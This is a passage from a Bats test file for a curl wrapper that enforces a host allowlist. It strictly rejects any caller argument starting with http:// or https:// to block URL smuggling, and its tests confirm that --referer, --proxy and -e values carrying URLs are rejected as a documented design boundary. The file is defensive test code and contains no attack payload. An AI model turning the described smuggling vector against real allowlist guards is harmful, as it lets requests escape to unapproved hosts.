    # If no --config-auth was supplied, the wrapper MUST NOT inject a stray
    # --config arg into curl (which would then fail to read the missing file).
    ! grep -qE '^--config$' "$MOCK_CURL_ARGV_LOG"
}

# ---------------------------------------------------------------------------
# S6 — Positional-URL strict-reject design boundary (BB iter-2 F8 SPECULATION)
# ---------------------------------------------------------------------------
#
# The Phase 1.7 case-statement match `[Hh][Tt][Tt][Pp]://*` strict-rejects
# any caller arg starting with http:// or https://. This is intentionally
# coarser than perfect curl-flag-taxonomy parsing: it catches naked
# positional URLs (the smuggling vector) but ALSO rejects legitimate flag
# values like `--referer https://x.com` and `--proxy https://proxy.example.com`.
# The trade-off is documented; none of the current cycle-099 callers use
# `--referer` / `--proxy` / `-e` / `-x` with URL values. Future callers
# that need such flags must refactor (e.g., wrap the flag-value pair in a
# config file) — which is the desired forcing-function for adding flag
# taxonomy awareness to the wrapper, not a silent breakage.
#
# These tests pin the design boundary: `--referer https://x` IS rejected,
# documenting the constraint rather than burying it in a comment.

@test "S6.1 caller --referer https://x in args is REJECTED (design boundary, not a defect)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        --referer "https://example.com"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
}

@test "S6.2 caller --proxy https://x in args is REJECTED (design boundary)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        --proxy "https://proxy.example.com:3128"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
}

@test "S6.3 caller -e https://x (referer short alias) in args is REJECTED (design boundary)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        -e "https://example.com"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
}
